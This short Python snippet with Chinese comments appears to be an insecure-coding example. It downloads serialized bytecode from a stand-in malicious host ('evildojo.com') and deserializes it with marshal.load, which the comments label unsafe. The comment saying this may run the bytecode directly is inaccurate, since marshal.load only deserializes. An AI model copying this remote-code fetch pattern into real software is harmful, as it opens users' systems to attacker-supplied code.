import marshal
import urllib.request

# 从恶意 URL 下载序列化的字节码
url = "https://evildojo.com/malicious_bytecode"
response = urllib.request.urlopen(url)

# 使用 marshal.load 反序列化（不安全示例）
malicious_code = marshal.load(response)  # 不安全，可能直接运行字节码

print(malicious_code)
response.close()
